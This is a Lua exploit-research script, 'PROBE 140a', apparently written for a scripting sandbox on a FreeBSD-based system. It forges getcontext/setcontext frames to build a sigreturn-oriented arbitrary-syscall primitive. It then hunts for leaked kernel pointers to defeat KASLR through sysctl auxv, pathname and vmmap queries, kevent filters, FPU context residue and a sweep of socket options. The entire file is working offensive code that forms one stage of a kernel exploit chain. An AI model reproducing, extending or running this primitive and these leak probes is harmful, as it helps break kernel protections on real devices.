-- CRASH_CLASS: LOW
-- PROBE 140a: Novel KASLR vectors — auxv, kevent EVFILT_PROC, FPU residue
--
-- A: sysctl kern.proc.auxv — auxiliary vector might contain AT_TIMEKEEP
--    or other kernel-related addresses
-- B: kevent with EVFILT_PROC to monitor our own process
-- C: FPU/SSE context residue — check xmm/ymm registers for kernel values
-- D: Deep socket option scan across all levels and options
-- E: sysctl kern.proc.pathname — might leak interesting info

print("=== PROBE 140a: AUXV+KEVENT+FPU ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: sysctl kern.proc.auxv = {1, 14, 16, pid}
-- FreeBSD auxiliary vector types:
-- AT_PHDR=3, AT_PHENT=4, AT_PHNUM=5, AT_PAGESZ=6, AT_FLAGS=8
-- AT_ENTRY=9, AT_BASE=7, AT_UID=11, AT_EUID=12, AT_GID=13, AT_EGID=14
-- AT_EXECPATH=15, AT_CANARY=16, AT_CANARYLEN=17, AT_OSRELDATE=18
-- AT_NCPUS=19, AT_PAGESIZES=20, AT_TIMEKEEP=22, AT_STACKPROT=23
-- AT_EHDRFLAGS=24, AT_HWCAP=25, AT_HWCAP2=26
--------------------------------------------------------------------
print("")
print("--- [A] kern.proc.auxv ---")
local mib = gpu + 0x100
local outbuf = gpu + 0x200
local oldlenp = gpu + 0x1F0
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 16) -- KERN_PROC_AUXV
memory.write_dword(mib + 12, pid)
zero(outbuf, 0x1000)
memory.write_dword(oldlenp, 0x1000)
memory.write_dword(oldlenp + 4, 0)
local rv_auxv = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local avh, avl = get_hi_lo(rv_auxv)
print("[A] sysctl auxv ret=" .. hex(rv_auxv))
local auxv_len = to_num(memory.read_dword(oldlenp))
print("[A] auxv len=" .. auxv_len)

if avl == 0 and avh == 0 and auxv_len > 0 then
    local at_names = {
        [1]="AT_IGNORE", [2]="AT_EXECFD", [3]="AT_PHDR", [4]="AT_PHENT",
        [5]="AT_PHNUM", [6]="AT_PAGESZ", [7]="AT_BASE", [8]="AT_FLAGS",
        [9]="AT_ENTRY", [11]="AT_UID", [12]="AT_EUID", [13]="AT_GID",
        [14]="AT_EGID", [15]="AT_EXECPATH", [16]="AT_CANARY",
        [17]="AT_CANARYLEN", [18]="AT_OSRELDATE", [19]="AT_NCPUS",
        [20]="AT_PAGESIZES", [22]="AT_TIMEKEEP", [23]="AT_STACKPROT",
        [24]="AT_EHDRFLAGS", [25]="AT_HWCAP", [26]="AT_HWCAP2",
    }
    -- Each auxv entry is 16 bytes: 8-byte type + 8-byte value
    local n_entries = math.min(math.floor(auxv_len / 16), 50)
    for i = 0, n_entries - 1 do
        local atype = safe_rq(outbuf + i * 16)
        local aval = safe_rq(outbuf + i * 16 + 8)
        if atype and aval then
            local th, tl = get_hi_lo(atype)
            local vh, vl = get_hi_lo(aval)
            if tl == 0 and th == 0 then break end -- AT_NULL
            local name = at_names[tl] or string.format("AT_%d", tl)
            print(string.format("[A] %s(%d): %s", name, tl, hex(aval)))
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("[A] *** KERNEL POINTER! ***")
            end
        end
    end
else
    print("[A] auxv sysctl FAILED")
    -- Try alternative MIB: {1, 14, 36, pid} — FreeBSD 12+ KERN_PROC_AUXV
    memory.write_dword(mib + 8, 36)
    zero(outbuf, 0x1000)
    memory.write_dword(oldlenp, 0x1000)
    memory.write_dword(oldlenp + 4, 0)
    local rv2 = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    print("[A] alt auxv ret=" .. hex(rv2))
    local len2 = to_num(memory.read_dword(oldlenp))
    print("[A] alt auxv len=" .. len2)
    local rv2h, rv2l = get_hi_lo(rv2)
    if rv2l == 0 and rv2h == 0 and len2 > 0 then
        local n_entries = math.min(math.floor(len2 / 16), 50)
        for i = 0, n_entries - 1 do
            local atype = safe_rq(outbuf + i * 16)
            local aval = safe_rq(outbuf + i * 16 + 8)
            if atype and aval then
                local th, tl = get_hi_lo(atype)
                local vh, vl = get_hi_lo(aval)
                if tl == 0 and th == 0 then break end
                print(string.format("[A] type=%d val=%s", tl, hex(aval)))
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("[A] *** KERNEL POINTER! ***")
                end
            end
        end
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: kevent with EVFILT_PROC on our own process
-- kqueue fd via sys 362, kevent via sys 363
-- struct kevent: ident(8), filter(2), flags(2), fflags(4), data(8), udata(8) = 32 bytes
-- EVFILT_PROC = -5
-- EV_ADD = 0x0001, EV_ENABLE = 0x0004
-- NOTE_EXIT = 0x80000000, NOTE_FORK = 0x40000000, NOTE_EXEC = 0x20000000
-- NOTE_TRACK = 0x00000001
--------------------------------------------------------------------
print("")
print("--- [B] kevent EVFILT_PROC ---")
local kq_fd = srop(362)
local kqh, kql = get_hi_lo(kq_fd)
print("[B] kqueue fd=" .. hex(kq_fd))
if kql > 0 and kql < 256 and kqh == 0 then
    local changelist = gpu + 0x2000
    local eventlist = gpu + 0x2100
    local timespec = gpu + 0x2200
    -- Zero timeout
    zero(timespec, 16)

    -- Register EVFILT_PROC on our own pid
    -- kevent struct: ident(8) filter(2) flags(2) fflags(4) data(8) udata(8) = 32
    zero(changelist, 64)
    -- ident = pid
    memory.write_dword(changelist, pid)
    memory.write_dword(changelist + 4, 0)
    -- filter = EVFILT_PROC = -5 (0xFFFB as int16)
    memory.write_byte(changelist + 8, 0xFB)
    memory.write_byte(changelist + 9, 0xFF)
    -- flags = EV_ADD|EV_ENABLE = 0x0005
    memory.write_byte(changelist + 10, 0x05)
    memory.write_byte(changelist + 11, 0x00)
    -- fflags = NOTE_EXIT|NOTE_FORK|NOTE_EXEC = 0xE0000000
    memory.write_dword(changelist + 12, 0xE0000000)

    zero(eventlist, 64)
    local rv_kev = srop(363, uint64(kql), ua(changelist), uint64(1),
        ua(eventlist), uint64(1), ua(timespec))
    print("[B] kevent(EVFILT_PROC)=" .. hex(rv_kev))
    local kevh, kevl = get_hi_lo(rv_kev)
    -- Dump returned event
    for off = 0, 0x30, 8 do
        local v = safe_rq(eventlist + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("[B] event+0x%02X: %s", off, hex(v)))
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("[B] *** KERNEL POINTER! ***")
                end
            end
        end
    end

    -- Also try EVFILT_TIMER (-7) and EVFILT_SIGNAL (-6)
    for _, filt_info in ipairs({
        {name="EVFILT_SIGNAL", filt=0xFFFA, ident=14}, -- SIGALRM
        {name="EVFILT_TIMER", filt=0xFFF9, ident=1},
        {name="EVFILT_USER", filt=0xFFF5, ident=42},
    }) do
        zero(changelist, 64)
        memory.write_dword(changelist, filt_info.ident)
        memory.write_byte(changelist + 8, filt_info.filt % 256)
        memory.write_byte(changelist + 9, math.floor(filt_info.filt / 256))
        memory.write_byte(changelist + 10, 0x05)
        memory.write_byte(changelist + 11, 0x00)
        zero(eventlist, 64)
        local rv = srop(363, uint64(kql), ua(changelist), uint64(1),
            ua(eventlist), uint64(1), ua(timespec))
        local rvh, rvl = get_hi_lo(rv)
        print(string.format("[B] kevent(%s)=%s", filt_info.name, hex(rv)))
        if rvl > 0 and rvl < 100 and rvh == 0 then
            for off = 0, 0x30, 8 do
                local v = safe_rq(eventlist + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("[B] %s+0x%02X: %s",
                            filt_info.name, off, hex(v)))
                        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                            kfound = kfound + 1
                            print("[B] *** KERNEL POINTER! ***")
                        end
                    end
                end
            end
        end
    end
    srop(6, uint64(kql))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: FPU/SSE context residue after SROP
-- The mcontext has FPU state at mc_fpstate area
-- On FreeBSD amd64: mc_fpstate is at MC+0xE0 (a pointer to savefpu)
-- OR the FPU state might be inline in the context
-- Also: xmm registers might contain kernel values if kernel used SSE
--------------------------------------------------------------------
print("")
print("--- [C] FPU context residue ---")
-- Get a fresh context
local fctx = memory.alloc(0x800)
pcall(function() return sc_gc(uint64(fctx)) end)
-- Scan the ENTIRE context for kernel pointers
print("[C] Full context scan:")
for off = 0, 0x400, 8 do
    local v = safe_rq(fctx + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print(string.format("[C] *** KPTR ctx+0x%03X: %s ***", off, hex(v)))
        end
        -- Also print anything in high address ranges (userland high)
        if vh >= 0x00000080 and vh < 0xFFFF0000 then
            print(string.format("[C] HIGH ctx+0x%03X: %s", off, hex(v)))
        end
    end
end

-- Now do SROP and then immediately get context again
-- The SROP -> getcontext -> read cycle might capture transient kernel state
pcall(function() return sc_gc(uint64(ctx)) end)
memory.write_qword(ctx + MC + 0xA0, sc_addr)
memory.write_qword(ctx + MC + 0x38, uint64(20)) -- getpid
pcall(function() return sc_sr(uint64(ctx)) end)
-- Immediately get context again
local fctx2 = memory.alloc(0x800)
pcall(function() return sc_gc(uint64(fctx2)) end)
-- Compare — look for new values
local diffs = 0
for off = 0, 0x400, 8 do
    local v1 = safe_rq(fctx + off)
    local v2 = safe_rq(fctx2 + off)
    if v1 and v2 then
        local h1, l1 = get_hi_lo(v1)
        local h2, l2 = get_hi_lo(v2)
        if h1 ~= h2 or l1 ~= l2 then
            diffs = diffs + 1
            if diffs <= 20 then
                print(string.format("[C] DIFF ctx+0x%03X: %s -> %s", off, hex(v1), hex(v2)))
            end
            if h2 >= 0xFFFF8000 and h2 ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[C] *** KPTR after SROP ctx+0x%03X: %s ***", off, hex(v2)))
            end
        end
    end
end
print("[C] total diffs=" .. diffs)
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: sysctl kern.proc.pathname = {1, 14, 12, pid}
-- And kern.proc.vmmap = {1, 14, 35, pid}
--------------------------------------------------------------------
print("")
print("--- [D] proc pathname + vmmap ---")
-- pathname
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 14)
memory.write_dword(mib + 8, 12) -- KERN_PROC_PATHNAME
memory.write_dword(mib + 12, pid)
zero(outbuf, 0x400)
memory.write_dword(oldlenp, 0x400)
memory.write_dword(oldlenp + 4, 0)
local rv_path = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local pth, ptl = get_hi_lo(rv_path)
print("[D] pathname ret=" .. hex(rv_path))
if ptl == 0 and pth == 0 then
    local path = ""
    for i = 0, 255 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b == 0 then break end
        if b >= 32 and b < 127 then path = path .. string.char(b) end
    end
    print("[D] pathname: " .. path)
end

-- vmmap
memory.write_dword(mib + 8, 35) -- KERN_PROC_VMMAP
zero(outbuf, 0x1000)
memory.write_dword(oldlenp, 0x1000)
memory.write_dword(oldlenp + 4, 0)
local rv_vmmap = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local vmh, vml = get_hi_lo(rv_vmmap)
print("[D] vmmap ret=" .. hex(rv_vmmap))
if vml == 0 and vmh == 0 then
    local vmlen = to_num(memory.read_dword(oldlenp))
    print("[D] vmmap len=" .. vmlen)
    -- Scan for kernel pointers
    for off = 0, math.min(vmlen, 0x1000) - 1, 8 do
        local v = safe_rq(outbuf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[D] *** KPTR vmmap+0x%03X: %s ***", off, hex(v)))
            end
        end
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: Deep socket option scan — ALL levels, ALL options
-- SOL_SOCKET=0xFFFF, IPPROTO_IP=0, IPPROTO_TCP=6, IPPROTO_UDP=17
-- Try options 0-100 on each level
--------------------------------------------------------------------
print("")
print("--- [E] socket option deep scan ---")
-- Create a TCP socket for option scanning
local tcp_fd = srop(97, uint64(2), uint64(1), uint64(6))
local tcph, tcpl = get_hi_lo(tcp_fd)
if tcpl > 0 and tcpl < 256 and tcph == 0 then
    print("[E] tcp fd=" .. tcpl)
    local opt_buf = gpu + 0x3000
    local opt_len_buf = gpu + 0x3100
    local hits = 0
    for _, lvl_info in ipairs({
        {name="SOL_SOCKET", lvl=0xFFFF},
        {name="IPPROTO_IP", lvl=0},
        {name="IPPROTO_TCP", lvl=6},
    }) do
        for opt = 0, 63 do
            zero(opt_buf, 0x100)
            memory.write_dword(opt_len_buf, 0x100)
            local rv = srop(118, uint64(tcpl), uint64(lvl_info.lvl), uint64(opt),
                ua(opt_buf), ua(opt_len_buf))
            local rvh, rvl = get_hi_lo(rv)
            if rvl == 0 and rvh == 0 then
                local optlen = to_num(memory.read_dword(opt_len_buf))
                if optlen > 0 then
                    hits = hits + 1
                    local has_kptr = false
                    for off = 0, math.min(optlen, 0x80) - 1, 8 do
                        local v = safe_rq(opt_buf + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                                kfound = kfound + 1
                                has_kptr = true
                                print(string.format("[E] *** KPTR %s opt=%d +0x%02X: %s ***",
                                    lvl_info.name, opt, off, hex(v)))
                            end
                        end
                    end
                    if optlen > 4 then
                        local val = safe_rq(opt_buf)
                        print(string.format("[E] %s opt=%d len=%d val=%s%s",
                            lvl_info.name, opt, optlen, hex(val),
                            has_kptr and " *** KPTR!" or ""))
                    end
                end
            end
        end
    end
    print("[E] socket opt hits=" .. hits)
    srop(6, uint64(tcpl))
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
